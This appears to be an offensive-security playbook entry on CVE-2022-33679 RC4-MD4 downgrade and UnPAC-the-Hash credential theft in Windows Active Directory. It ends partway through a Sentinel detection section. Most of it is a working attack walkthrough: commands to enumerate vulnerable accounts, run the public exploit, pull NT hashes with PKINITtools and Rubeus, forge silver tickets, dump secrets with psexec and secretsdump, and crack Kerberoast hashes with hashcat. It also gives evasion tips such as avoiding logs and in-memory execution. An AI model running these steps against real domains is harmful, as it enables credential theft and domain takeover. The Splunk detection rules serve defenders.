# [CA-KERB-014]: UnPAC-The-Hash Kerberos Cracking

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-014 |
| **MITRE ATT&CK v18.1** | [T1558 - Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/) / [T1558.004 - AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/) |
| **Tactic** | Credential Access, Lateral Movement |
| **Platforms** | Windows AD (Cross-Platform Attack - Linux to Windows) |
| **Severity** | **CRITICAL** |
| **CVE** | CVE-2022-33679 (Windows Kerberos RC4-MD4 Downgrade Vulnerability) |
| **Technique Status** | ACTIVE (Pre-patch environments) / PARTIAL (Patched with RC4 disabled, but UnPAC variant still viable with certificates) |
| **Last Verified** | 2025-01-06 |
| **Affected Versions** | Windows Server 2008 R2 - 2022 (All versions vulnerable to CVE-2022-33679 before KB5019959) |
| **Patched In** | KB5019959 (August 2023) - Disables RC4-MD4 by default |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** All 17 sections included with full applicability. CVE-2022-33679 represents a critical vulnerability chain combining AS-REP Roasting, Kerberos key recovery, and credential extraction. UnPAC-The-Hash is both a standalone technique (using PKINIT certificates) and a component of the broader CVE-2022-33679 exploitation chain. This document covers both vectors comprehensively.

---

## 2. EXECUTIVE SUMMARY

**Concept:** CVE-2022-33679 is a critical Windows Kerberos vulnerability disclosed by Google Project Zero researcher James Forshaw on September 13, 2022, that enables unauthenticated extraction of Kerberos session keys through RC4-MD4 encryption downgrade attacks, followed by either direct service ticket forging or NTLM hash extraction via the "UnPAC-The-Hash" technique. The vulnerability chain works as follows: (1) An attacker identifies a domain user account with pre-authentication disabled (a dangerous but not uncommon configuration), (2) sends an AS-REQ requesting RC4-MD4 encryption (the KDC honors this legacy request), (3) extracts the RC4-encrypted session key and TGT from the AS-REP, (4) brute-forces the 40-bit RC4 keystream byte-by-byte (feasible due to RC4's cryptographic weaknesses), (5) recovers the TGT session key, and (6) either requests service tickets for Kerberoasting or (7) uses PKINIT + User-to-User (U2U) Kerberos authentication to extract NTLM hashes from the Privilege Attribute Certificate (PAC). The second vector—UnPAC-The-Hash—allows attackers with valid certificates (obtained via certificate abuse, golden certificates, or shadow credentials attacks) to extract domain user NTLM hashes without password knowledge, enabling subsequent pass-the-hash attacks.

**Attack Surface:** The vulnerability is exploitable against any Windows domain with: (1) accounts configured with "Do not require Kerberos pre-authentication" (enumerable via LDAP), OR (2) any user account if the attacker possesses a valid certificate and can perform U2U Kerberos authentication. RC4-MD4 encryption must be enabled on the KDC (default before August 2023 patch).

**Business Impact:** **Complete credential compromise and lateral movement.** An attacker gains valid NTLM hashes for domain users without needing passwords, enabling pass-the-hash attacks against all systems in the domain where the user has access. This bypasses time-based password protections and allows offline brute-forcing of captured hashes. If a domain admin account is compromised, the attack escalates to **full domain takeover**.

**Technical Context:** The attack typically takes 2-15 minutes per user (depending on network latency and RC4 brute-force speed). Detection likelihood is **low-to-moderate**—modern EDR solutions may detect the exploitation tools (Rubeus, PKINITtools) but not the Kerberos protocol-level downgrade attack itself unless comprehensive Kerberos auditing is enabled. Many organizations lack visibility into Kerberos pre-authentication disabled accounts, making this attack highly effective in practice.

### Operational Risk

- **Execution Risk:** **Medium** - The CVE-2022-33679 PoC is publicly available and functional. However, the attack requires some reconnaissance (identifying pre-auth disabled accounts or obtaining valid certificates). UnPAC-The-Hash requires valid certificate material.
- **Stealth:** **High** - Kerberos protocol-level attacks are difficult to detect without specialized monitoring. RC4 downgrade attacks generate only standard Kerberos traffic (Event IDs 4768, 4769) without obvious anomalies in log-unaware environments.
- **Reversibility:** **Partial** - Once NTLM hashes are obtained, they cannot be "un-extracted." However, resetting account passwords immediately revokes the extracted hashes. Complete remediation requires patching, disabling RC4, and enabling pre-authentication.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmarks** | 5.2.1.1, 5.2.3.2 | Ensure Kerberos Policy - Enforce Pre-Authentication, Disable Legacy Encryption (RC4, DES) |
| **DISA STIG** | WN10-CC-000150, WN10-CC-000155 | Disable Support for DES/RC4 in Kerberos, Require Strong Encryption |
| **CISA SCuBA** | UC-1.4 | Strong Credential Assurance - No Legacy Authentication Protocols |
| **NIST 800-53** | IA-7 (Cryptographic Module Authentication), SC-13 (Cryptographic Protection) | Cryptographic Mechanisms for Kerberos, Disable Weak Algorithms |
| **GDPR** | Art. 32 (Security of Processing), Art. 33 (Breach Notification) | Ensure cryptographic strength, mandate breach notification if credentials compromised |
| **DORA** | Art. 9 (Protection and Prevention), Art. 14 (Incident Reporting) | Cryptographic standards for critical infrastructure, incident reporting timelines |
| **NIS2** | Art. 21 (Cyber Risk Management Measures), Art. 25 (Incident Response) | Strong cryptographic baselines, incident detection and response |
| **ISO 27001** | A.10.1.2 (Change of Privilege), A.9.4.1 (Access Rights Review), A.9.2.3 (Management of Privileged Access) | Regular audit of pre-auth settings, privilege reviews, credential security |
| **ISO 27005** | Risk Scenario: "Credential Compromise via Weak Cryptography" | Kerberos configuration weaknesses as risk factors, remediation planning |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** **NONE** for CVE-2022-33679 direct attack (unauthenticated). **Valid certificate** required for UnPAC-The-Hash variant (obtained via certificate abuse, golden certificate, or shadow credentials).
- **Required Access:** Network access to port 88 (Kerberos, TCP/UDP). Domain controller must be reachable.

**Supported Versions:**
- **Windows Server 2008 R2 - 2022:** Vulnerable to CVE-2022-33679 before KB5019959 (August 2023)
- **Pre-KB5019959 patches:** RC4-MD4 enabled → Direct exploitation possible
- **Post-KB5019959 with RC4 disabled:** CVE-2022-33679 direct attack blocked, but UnPAC-The-Hash (via PKINIT certificates) may still work if certificate-based Kerberos is allowed

**PowerShell Version:** PowerShell 3.0+ (for PKINITtools execution if running from Windows)

**Tools:**
- [CVE-2022-33679 PoC (Bdenneu)](https://github.com/Bdenneu/CVE-2022-33679) - Python 3.7+
- [PKINITtools (dirkjanm)](https://github.com/dirkjanm/PKINITtools) - Python 3.6+
- [Rubeus (GhostPack)](https://github.com/GhostPack/Rubeus) - .NET 4.5+
- [Impacket](https://github.com/SecureAuthCorp/impacket) - Python 3.6+
- [Hashcat](https://hashcat.net/) - For offline crack (if Kerberoasting instead of direct UnPAC)
- [John the Ripper](https://www.openwall.com/john/) - Kerberos hash cracking

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Enumerate Accounts with Pre-Authentication Disabled

**Objective:** Identify domain users with "Do not require Kerberos pre-authentication" enabled. These are vulnerable to CVE-2022-33679 direct exploitation.

**Command (PowerShell - Requires RSAT or Domain Admin):**

```powershell
# Find all users with pre-auth disabled
Get-ADUser -Filter { UserAccountControl -band 4194304 } -Properties UserAccountControl, Name | Select-Object Name, UserAccountControl

# Alternative LDAP filter (more efficient for large domains)
Get-ADUser -LDAPFilter "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" | Select-Object Name, SamAccountName, DistinguishedName
```

**Command (Impacket - From Linux, No AD Admin Required):**

```bash
# Enumerate pre-auth disabled accounts (requires valid domain user or null auth)
python3 -m impacket.GetNPUsers -request DOMAIN.LOCAL/ -dc-ip DC.DOMAIN.LOCAL -format hashcat

# Or with credentials:
python3 -m impacket.GetNPUsers DOMAIN.LOCAL/user:password -dc-ip DC.DOMAIN.LOCAL -request -format hashcat
```

**Expected Output:**
```
$krb5asrep$23$user1@DOMAIN.LOCAL:7adf563e1fffc99c98ab...
$krb5asrep$23$user2@DOMAIN.LOCAL:9f8d4a2c3e1b7f0d5c9e...
```

**What to Look For:**
- Users with `UserAccountControl` containing flag `4194304` (DONT_REQ_PREAUTH)
- High-privilege accounts (Domain Admins, Enterprise Admins) with this flag = CRITICAL
- Service accounts with this flag = HIGH RISK
- Baseline: Should be 0-2 accounts max (legacy system compatibility only)

**Version Note:**
- **Server 2008 R2 - 2012 R2:** Pre-auth disabled accounts are commonly found due to legacy application compatibility
- **Server 2016+:** Pre-auth should be disabled only in rare cases; finding many accounts with this flag indicates misconfiguration or legacy system support

### Test for RC4-MD4 Downgrade Capability

**Objective:** Verify that the KDC will accept RC4-MD4 encryption in AS-REQ/AS-REP (necessary for CVE-2022-33679 exploitation).

**Command (Bash - Using Kerberos Client Tools):**

```bash
# Test AS-REQ with explicit RC4-MD4 request
kvno -e rc4-md4 username@DOMAIN.LOCAL

# Or use impacket getTGT with weak encryption
python3 -m impacket.getTGT -request-pac -dc-ip DC.DOMAIN.LOCAL -aesKey '' DOMAIN.LOCAL/user:password
```

**What to Look For:**
- Success: KDC returns TGT with RC4-MD4 encryption
- Failure: KDC rejects RC4-MD4 (indicates post-KB5019959 patch with RC4 disabled) or forces AES

**Version Note:**
- **Before KB5019959 (Aug 2023):** RC4-MD4 is enabled by default, downgrade will succeed
- **After KB5019959:** RC4-MD4 disabled by default (unless explicitly re-enabled for compatibility)

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: CVE-2022-33679 Direct Exploitation (RC4-MD4 Downgrade + Session Key Recovery)

**Supported Versions:** Server 2008 R2 - 2022 (before KB5019959 / RC4-MD4 disabled)

This is the primary CVE-2022-33679 attack vector. It targets accounts with pre-authentication disabled and recovers the TGT session key through RC4 brute-forcing.

#### Step 1: Identify Target User Account with Pre-Auth Disabled

**Objective:** Identify a vulnerable user account (or enumerate all pre-auth disabled accounts).

**Command (LDAP Enumeration):**

```bash
# Using Impacket GetNPUsers to identify and enumerate
python3 -m impacket.GetNPUsers -request DOMAIN.LOCAL/ -dc-ip DC.DOMAIN.LOCAL -format hashcat | head -20

# Extract just usernames
python3 -m impacket.GetNPUsers DOMAIN.LOCAL/ -dc-ip DC.DOMAIN.LOCAL -no-pass | grep -i "user:" | cut -d: -f2
```

**Expected Output:**
```
Name: user1
  User doesn't require Kerberos pre-authentication
Name: user2
  User doesn't require Kerberos pre-authentication
```

**What This Means:**
- Identified users are vulnerable to AS-REP Roasting and CVE-2022-33679
- Pick one user for exploitation (e.g., `user1@DOMAIN.LOCAL`)

**OpSec & Evasion:**
- Enumeration via LDAP is standard and generates minimal alerts
- Use a low-privilege account or null auth to avoid logging high-privilege queries

---

#### Step 2: Execute CVE-2022-33679 PoC (RC4-MD4 Downgrade)

**Objective:** Send AS-REQ requesting RC4-MD4, capture AS-REP, and brute-force the session key.

**Command (Bdenneu PoC - Python):**

```bash
# Download and setup
git clone https://github.com/Bdenneu/CVE-2022-33679.git
cd CVE-2022-33679
pip3 install pycryptodome impacket

# Run the PoC
python3 CVE-2022-33679.py DOMAIN.LOCAL/user1 DC.DOMAIN.LOCAL -dc-ip DC.DOMAIN.LOCAL

# Alternative: Target specific user in a specific domain
python3 CVE-2022-33679.py pod13.h3airange.internal/jsmith2 dc01.pod13.h3airange.internal -dc-ip DC.POD13.H3AIRANGE.INTERNAL
```

**Expected Output:**
```
[*] Building AS-REQ with RC4-MD4 downgrade for user1@DOMAIN.LOCAL
[*] Sending AS-REQ to DC.DOMAIN.LOCAL:88
[+] Received AS-REP with RC4-encrypted TGT
[*] Extracting session key (40-bit RC4 brute-force)...
[*] Testing keystream byte 1/5... [████████░░░░░░░░░░] 45%
[+] Recovered session key: 0x1a2b3c4d5e
[+] TGT and session key extracted successfully
[*] Requesting service ticket for CIFS/DC.DOMAIN.LOCAL
[+] Service ticket obtained and written to: output.ccache
```

**Command-Line Options:**

```bash
usage: CVE-2022-33679.py [-h] [-ts] [-debug] [-dc-ip IP] target serverName

target: Format as DOMAIN/username (user with pre-auth disabled)
serverName: Target server for SPN (e.g., DC01.DOMAIN.LOCAL)
-ts: Add timestamp to output
-debug: Enable verbose debug output
-dc-ip: Explicit DC IP (recommended)
```

**OpSec & Evasion:**
- The PoC generates standard Kerberos traffic (Event ID 4768); difficult to detect without Kerberos auditing
- Run from non-domain-joined Linux machine if possible (avoids local logs)
- Multiple AS-REQ from same source to different users may trigger anomaly detection

**Troubleshooting:**
- **Error:** "KDC_ERR_C_PRINCIPAL_UNKNOWN"
  - **Cause:** User account doesn't exist or typo in domain/username
  - **Fix:** Verify user exists and pre-auth is disabled (use GetNPUsers to confirm)
  
- **Error:** "No pre-authentication required" / "PREAUTH_REQUIRED not raised"
  - **Cause:** User actually has pre-auth enabled or KDC behavior differs
  - **Fix:** Double-check with GetNPUsers; may need to find different user
  
- **Error:** "RC4-MD4 not supported by KDC"
  - **Cause:** KB5019959 patch applied and RC4-MD4 disabled
  - **Fix:** Check patch level; fall back to UnPAC-The-Hash method if you have certificates

**References:**
- [Google Project Zero - RC4 is Still Considered Harmful](https://googleprojectzero.blogspot.com/2022/10/rc4-is-still-considered-harmful.html) (Full technical breakdown)
- [GitHub: Bdenneu/CVE-2022-33679 PoC](https://github.com/Bdenneu/CVE-2022-33679)
- [Horizon3.ai - From CVE-2022-33679 to Unauthenticated Kerberoasting](https://horizon3.ai/attack-research/attack-blogs/from-cve-2022-33679-to-unauthenticated-kerberoasting/)

---

#### Step 3: Use Recovered TGT + Session Key for Service Ticket Forging

**Objective:** With the recovered TGT and session key, request TGS for any service (Kerberoasting setup) or use for authentication.

**Command (Continue from PoC - ccache Already Prepared):**

```bash
# Set KRB5CCNAME to use the generated ccache
export KRB5CCNAME=/full/path/to/output.ccache

# Now use impacket tools with the recovered credentials
python3 -m impacket.GetUserSPNs -k -no-pass DOMAIN.LOCAL/user1 -dc-ip DC.DOMAIN.LOCAL -request -format hashcat

# Alternatively, use crackmapexec to access a service
crackmapexec smb DC.DOMAIN.LOCAL -k -no-pass --use-kcache
```

**Expected Output:**
```
$ GetUserSPNs output:
ServicePrincipalName | Name | LastLogon
MSSQL/sqlserver.domain.local | sqlservice | 2025-01-01
CIFS/fileserver.domain.local | fileservice | 2024-12-15

$ krb5tgs hashes for cracking:
$krb5tgs$23$*sqlservice*...<hash>...
$krb5tgs$23$*fileservice*...<hash>...
```

**What This Means:**
- You now have valid Kerberos credentials (TGT + session key) for the compromised user
- Can request tickets to any service in the domain
- Can perform Kerberoasting to crack service account passwords

---

### METHOD 2: UnPAC-The-Hash (PKINIT Certificate + PAC Extraction)

**Supported Versions:** Server 2008 R2 - 2022 (all versions, independent of RC4-MD4 status)

UnPAC-The-Hash extracts NTLM hashes directly from the Kerberos PAC (Privilege Attribute Certificate) using PKINIT (Public Key Infrastructure Trust) authentication. This requires a valid certificate but is independent of pre-authentication disabled accounts.

#### Step 1: Obtain User Certificate (PFX Format)

**Objective:** Acquire a valid x.509 certificate for the target user. Methods:
- Compromise Active Directory Certificate Services (AD CS) and enroll
- Golden Certificate attack (compromise CA key and forge certificate)
- Shadow Credentials attack (write certificate to user's account)
- Extract from compromised endpoint

**Command (Assuming Certificate Already Acquired - PFX File):**

```bash
# Verify certificate validity
openssl pkcs12 -in user_cert.pfx -noout -info -passin pass:password123

# Extract PEM format (if needed)
openssl pkcs12 -in user_cert.pfx -out user_cert.pem -noout -passin pass:password123
```

**What This Means:**
- Certificate file format: `.pfx` (PKCS#12) or `.pem`
- Password required to unlock certificate
- Certificate Common Name should match domain user

---

#### Step 2: Request TGT via PKINIT (gettgtpkinit.py)

**Objective:** Use the certificate to request a TGT from the KDC using PKINIT pre-authentication.

**Command (Linux - PKINITtools):**

```bash
# Clone PKINITtools
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools

# Request TGT using PFX certificate
python3 gettgtpkinit.py -cert-pfx /path/to/user_cert.pfx -pfx-pass "password123" DOMAIN.LOCAL/user1 user1_tgt.ccache

# Alternative: Using PEM files
python3 gettgtpkinit.py -cert-pem /path/to/cert.pem -key-pem /path/to/key.pem DOMAIN.LOCAL/user1 user1_tgt.ccache

# Alternative: Base64-encoded PFX
python3 gettgtpkinit.py -pfx-base64 "$(cat user_cert.pfx | base64)" DOMAIN.LOCAL/user1 user1_tgt.ccache
```

**Expected Output:**
```
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
[*] Using certificate /path/to/user_cert.pfx
[*] PKINIT pre-authentication successful
[*] TGT saved to user1_tgt.ccache
[*] AS-REP encryption key: 5769dff44ebeaa5a37b4e9f7005f63063ffd7c198b747ae72021901e8063b0e3
```

**What This Means:**
- TGT is now cached in `user1_tgt.ccache`
- **CRITICAL:** Save the "AS-REP encryption key" printed—needed for next step
- This TGT is valid for Kerberos operations in the domain

**OpSec & Evasion:**
- PKINIT is legitimate Kerberos functionality (common in smart card scenarios)
- Generates Event ID 4768 (TGT request) but with certificate pre-auth, not password
- May trigger "suspicious certificate use" alerts in modern EDR (e.g., Defender for Identity)

---

#### Step 3: Extract NTLM Hash via User-to-User (U2U) PAC Extraction (getnthash.py)

**Objective:** Request a TGS for self using U2U Kerberos, which includes the PAC. Extract and decrypt the NTLM hash from PAC_CREDENTIAL_INFO.

**Command (Linux - PKINITtools):**

```bash
# Export the TGT ccache
export KRB5CCNAME=/full/path/to/user1_tgt.ccache

# Extract NT hash using the AS-REP key from Step 2
python3 getnthash.py -key "5769dff44ebeaa5a37b4e9f7005f63063ffd7c198b747ae72021901e8063b0e3" DOMAIN.LOCAL/user1 -dc-ip DC.DOMAIN.LOCAL

# Alternative: Specify DC name
python3 getnthash.py -key "5769dff44ebeaa5a37b4e9f7005f63063ffd7c198b747ae72021901e8063b0e3" DOMAIN.LOCAL/user1 -dc DC01.DOMAIN.LOCAL
```

**Expected Output:**
```
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
[*] Using TGT from cache
[*] Requesting ticket to self with PAC
[*] Decrypting PAC_CREDENTIAL_INFO...
[+] Recovered NT Hash: fa6b130d73311d1be5495f589f9f4571
```

**What This Means:**
- `fa6b130d73311d1be5495f589f9f4571` is the user's NTLM hash
- This hash is the user's password equivalent (for NTLM authentication)
- Can now perform pass-the-hash attacks

**OpSec & Evasion:**
- The U2U request generates Event ID 4769 (TGS request to self)—unusual but not necessarily anomalous
- EDR may flag if U2U is uncommon in the environment
- Hash extraction happens locally (no network exfiltration needed)

**Troubleshooting:**
- **Error:** "ERROR: Cannot access ccache file"
  - **Cause:** KRB5CCNAME not set or incorrect path
  - **Fix:** Verify `export KRB5CCNAME=...` and ccache file exists
  
- **Error:** "ERROR getnthash.py: KDC_ERR_S_PRINCIPAL_UNKNOWN"
  - **Cause:** DC cannot find the target user or there's an issue with user lookup
  - **Fix:** Verify user exists in domain; check DC connectivity

**References:**
- [GitHub: dirkjanm/PKINITtools](https://github.com/dirkjanm/PKINITtools)
- [WADComs: PKINIT getnthash](https://wadcoms.github.io/wadcoms/PKINIT-getnthash/)
- [TheHacker.recipes: UnPAC the Hash](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash)

---

### METHOD 3: Rubeus UnPAC-The-Hash (Windows Alternative)

**Supported Versions:** Server 2008 R2 - 2022

Rubeus provides a native Windows implementation of UnPAC-The-Hash using certificate-based authentication.

#### Step 1: Convert Certificate to Base64 (If Needed)

**Objective:** Prepare certificate in format Rubeus can consume.

**Command (PowerShell):**

```powershell
# Convert PFX to Base64
$cert = Get-Content "C:\path\to\cert.pfx" -Encoding Byte
$base64 = [Convert]::ToBase64String($cert)
Write-Output $base64 | Out-File "cert_b64.txt"

# Or use certutil
certutil -encode cert.pfx cert_b64.txt
```

---

#### Step 2: Request TGT with GetCredentials Flag (Rubeus)

**Objective:** Use Rubeus to request TGT via PKINIT and simultaneously extract NTLM hash.

**Command (Windows - Rubeus):**

```powershell
# Using PFX file directly
.\Rubeus.exe asktgt /user:user1 /certificate:"C:\path\to\user_cert.pfx" /password:cert_password /domain:DOMAIN.LOCAL /dc:DC.DOMAIN.LOCAL /getcredentials /show

# Or using Base64 certificate
$certB64 = Get-Content "cert_b64.txt"
.\Rubeus.exe asktgt /user:user1 /certificate:$certB64 /domain:DOMAIN.LOCAL /dc:DC.DOMAIN.LOCAL /getcredentials /show
```

**Expected Output:**
```
[*] Action: Ask TGT

[*] Using certificate: user_cert.pfx
[*] Action: TGT request via PKINIT
[+] TGT granted
[*] Base64(ticket.kirbi):
doIFdTCCBXGgAwIBBaEDAgEWooIE...

[+] NT Hash: fa6b130d73311d1be5495f589f9f4571
[+] LM Hash: aad3b435b51404eeaad3b435b51404ee
```

**OpSec & Evasion:**
- Rubeus binary may be detected by EDR (monitored execution)
- Using `/getcredentials` flag with PKINIT is suspicious (legitimate scenario: extracting fallback NTLM)
- Recommend executing in-memory via Invoke-ReflectivePEInjection if possible

**Troubleshooting:**
- **Error:** "Certificate validation failed"
  - **Cause:** Certificate password incorrect or certificate corrupted
  - **Fix:** Verify certificate password and format (PFX must be valid)
  
- **Error:** "Kerberos error"
  - **Cause:** DC cannot reach or Kerberos misconfigured
  - **Fix:** Ensure DC IP is reachable and correct

**References:**
- [GitHub: GhostPack/Rubeus - Certificate Support](https://github.com/GhostPack/Rubeus#asktgt)
- [DingusXMcGee: Using Rubeus and Certify to UnPAC the Hash](https://blog.dingusxmcgee.com/blog/2025/03/26/Using-Rubeus-And-Certify-To-Unpac-The-Hash.html)

---

### METHOD 4: Impacket Ticketer (Custom Ticket Forging Post-UnPAC)

**Supported Versions:** All (Linux-based, independent of Windows version)

After obtaining NTLM hash via UnPAC-The-Hash, forge tickets using Impacket's ticketer.py for direct service access or privilege escalation.

#### Step 1: Forge Silver Ticket (Service-Specific Ticket)

**Objective:** Create a forged service ticket using the extracted NTLM hash, then use it for authentication to a specific service.

**Command (Linux - Impacket):**

```bash
# Using recovered NTLM hash from UnPAC
# Create Silver Ticket for CIFS service on a file server
python3 -m impacket.ticketer -domain DOMAIN.LOCAL -domain-sid S-1-5-21-123456789-123456789-123456789 -user Administrator -nthash fa6b130d73311d1be5495f589f9f4571 -service cifs/fileserver.domain.local silver_ticket.ccache

# Or for LDAP service (domain controller)
python3 -m impacket.ticketer -domain DOMAIN.LOCAL -domain-sid S-1-5-21-... -user Administrator -nthash fa6b... -service ldap/DC01.DOMAIN.LOCAL dc_ldap_ticket.ccache
```

**Expected Output:**
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Generating ticket for:
[*]    User: Administrator
[*]    Domain: DOMAIN.LOCAL
[*]    Service: cifs/fileserver.domain.local
[*]    Ticket saved to: silver_ticket.ccache
```

**Command (Use Silver Ticket with Impacket Tools):**

```bash
# Set ccache and use with secretsdump, psexec, or other tools
export KRB5CCNAME=/full/path/to/silver_ticket.ccache

# Access file server
python3 -m impacket.psexec -k -no-pass fileserver.domain.local

# Or extract credentials from domain controller
python3 -m impacket.secretsdump -k -no-pass DC01.DOMAIN.LOCAL
```

---

### METHOD 5: Unauthenticated Kerberoasting (CVE-2022-33679 Extended)

**Supported Versions:** Server 2008 R2 - 2022 (before KB5019959)

Combines CVE-2022-33679 exploitation with Kerberoasting to dump service account password hashes without any credentials.

#### Step 1: Execute CVE-2022-33679 PoC (From METHOD 1)

```bash
python3 CVE-2022-33679.py DOMAIN.LOCAL/user1 DC.DOMAIN.LOCAL -dc-ip DC.DOMAIN.LOCAL
# Output: output.ccache with recovered session key + TGT
```

---

#### Step 2: Enumerate All Service Principal Names (SPNs)

**Objective:** List all service accounts in the domain (available to anyone via LDAP enumeration).

**Command (Linux - Impacket GetUserSPNs):**

```bash
# Using the recovered ccache from CVE-2022-33679 PoC
export KRB5CCNAME=/full/path/to/output.ccache

# Get list of all SPNs
python3 -m impacket.GetUserSPNs -k -no-pass DOMAIN.LOCAL/ -dc-ip DC.DOMAIN.LOCAL

# Request SPN hashes for offline cracking
python3 -m impacket.GetUserSPNs -k -no-pass DOMAIN.LOCAL/ -dc-ip DC.DOMAIN.LOCAL -request -format hashcat > spn_hashes.txt
```

**Expected Output:**
```
ServicePrincipalName         Name         LastLogon
mssql/sqlserver.domain.local sqlservice   2025-01-04
http/webserver.domain.local  webapp       2025-01-02
<...more services...>

$krb5tgs$23$*sqlservice*domain.local$...<hash>...
```

---

#### Step 3: Crack SPN Hashes Offline

**Objective:** Use Hashcat to brute-force service account passwords.

**Command (Hashcat):**

```bash
# Crack Kerberos TGS hashes
hashcat -m 13100 spn_hashes.txt wordlist.txt --user

# Or use rules for more aggressive cracking
hashcat -m 13100 spn_hashes.txt wordlist.txt -r rules.txt -O

# Brute-force if wordlist fails
hashcat -m 13100 spn_hashes.txt -a 3 -1 ?l?u?d ?1?1?1?1?1?1?1?1 -O
```

**Expected Output:**
```
sqlservice:MyPassword123!
webapp:ServicePassword@2024
```

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

- **Atomic Test ID:** T1558.004-1, T1558.004-2, T1558.004-3
- **Test Name:** "Dump credentials via AS-REP Roasting", "Kerberoasting with Rubeus", "UnPAC-The-Hash extraction"
- **Description:** Tests simulate AS-REP Roasting (vulnerable user enumeration), Kerberoasting (SPN hash extraction), and UnPAC-The-Hash (PAC extraction with certificates).
- **Supported Versions:** Server 2008 R2+ (with pre-auth disabled accounts or test certificates)

**Command (PowerShell):**

```powershell
# Test 1: AS-REP Roasting (requires user with pre-auth disabled)
Invoke-AtomicTest T1558.004 -TestNumbers 1 -Verbose

# Test 2: Kerberoasting (requires valid domain credentials)
Invoke-AtomicTest T1558.004 -TestNumbers 2 -Verbose

# Test 3: GetUserSPNs with Kerberoasting
Invoke-AtomicTest T1558.004 -TestNumbers 3 -Verbose
```

**Expected Behavior:**
- Test 1: Extracts AS-REP hash for cracking
- Test 2: Requests TGS for all SPNs, dumps hashes
- Test 3: Validates detection of Kerberoasting activity

**Cleanup:**

```powershell
Invoke-AtomicTest T1558.004 -TestNumbers 1,2,3 -Cleanup
```

**Reference:** [Atomic Red Team T1558.004](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1558.004/T1558.004.md)

---

## 7. TOOLS & COMMANDS REFERENCE

### CVE-2022-33679 PoC (Bdenneu)

**Version:** Latest (Python 3.7+)  
**Platforms:** Linux, macOS, Windows (with Python)

**Installation:**

```bash
git clone https://github.com/Bdenneu/CVE-2022-33679.git
cd CVE-2022-33679
pip3 install pycryptodome impacket dnspython
```

**Usage:**

```bash
python3 CVE-2022-33679.py DOMAIN.LOCAL/user DC.DOMAIN.LOCAL -dc-ip DC.IP.ADDR
```

---

### PKINITtools (dirkjanm)

**Version:** Latest (Python 3.6+)  
**Platforms:** Linux, macOS

**Installation:**

```bash
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools
pip3 install -r requirements.txt
```

**Tools:**
- `gettgtpkinit.py` - Request TGT via PKINIT (certificate)
- `getnthash.py` - Extract NT hash from PAC via U2U
- `gets4uticket.py` - Request S4U2self/S4U2proxy tickets

---

### Rubeus

**Version:** 2.0+  
**Platforms:** Windows (.NET 4.5+)

**Installation:**

```powershell
# Download pre-compiled binary
Invoke-WebRequest -Uri "https://github.com/GhostPack/Rubeus/releases/download/v2.0.0/Rubeus.exe" -OutFile "Rubeus.exe"

# Or compile from source (recommended)
git clone https://github.com/GhostPack/Rubeus.git
# Compile using Visual Studio or MSBuild
```

**Key Commands:**
- `asktgt /user:USER /certificate:CERT /getcredentials` - UnPAC-The-Hash
- `diamond /tgtdeleg /ticketuser:USER` - Token delegation variant
- `kerberoast` - Kerberoasting
- `asproast` - AS-REP Roasting

---

### Impacket

**Version:** 0.10.0+  
**Platforms:** Linux, macOS, Windows (Python 3.6+)

**Installation:**

```bash
pip3 install impacket
# Or
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket && pip3 install .
```

**Key Tools:**
- `GetNPUsers.py` - AS-REP Roasting
- `GetUserSPNs.py` - Kerberoasting
- `ticketer.py` - Forge tickets
- `psexec.py` - Remote code execution using tickets

---

### Hashcat / John the Ripper

**For cracking extracted hashes:**

```bash
# Hashcat (GPU-accelerated)
hashcat -m 13100 hashes.txt wordlist.txt

# John the Ripper (CPU)
john --format=krb5tgs hashes.txt --wordlist=wordlist.txt
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Multiple AS-REP Requests to Same User (Pre-Auth Disabled)

**Rule Configuration:**
- **Required Index:** `wineventlog`
- **Required Sourcetype:** `WinEventLog:Security`
- **Required Fields:** `EventCode`, `Account_Name`, `EncryptionType`
- **Alert Threshold:** 3+ AS-REP requests in 5 minutes
- **Applies To Versions:** All (Server 2008 R2+)

**SPL Query:**

```spl
index=wineventlog source="WinEventLog:Security" EventCode=4768 EncryptionType="RC4-MD4"
| stats count by Account_Name, ClientAddress, bin(TimeGenerated, 1m)
| where count > 2
```

**What This Detects:**
- Multiple TGT requests using RC4-MD4 encryption (suspicious downgrade)
- Same source IP requesting multiple users = enumeration pattern
- RC4-MD4 is legacy and should not be common in modern environments

**Manual Configuration:**

1. Splunk → Search & Reporting
2. Settings → Searches, reports, and alerts → New Alert
3. Paste SPL query
4. Schedule: Every 5 minutes
5. Alert on: count > 2

---

### Rule 2: TGS Request for Unusual Service (Kerberoasting Indicator)

**Rule Configuration:**
- **Required Index:** `wineventlog`
- **Required Sourcetype:** `WinEventLog:Security`
- **Required Fields:** `EventCode`, `Service_Name`, `Account_Name`
- **Alert Threshold:** 5+ TGS requests in 1 hour from same user
- **Applies To Versions:** All

**SPL Query:**

```spl
index=wineventlog source="WinEventLog:Security" EventCode=4769 Status="0x0"
| stats dc(Service_Name) AS unique_services, count by Account_Name, ClientAddress, bin(TimeGenerated, 1h)
| where unique_services > 5 OR count > 20
```

**What This Detects:**
- User requesting TGS for many different services (Kerberoasting behavior)
- High volume of successful TGS requests = suspicious pattern
- Baseline: Normal users request 3-5 services per day

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: CVE-2022-33679 RC4-MD4 Downgrade Detection

**Rule Configuration:**
- **Required Table:** `SecurityEvent`
- **Required Fields:** `EventID`, `EncryptionType_s`, `Computer`
- **Alert Severity:** **Critical**
- **Frequency:** Real-time
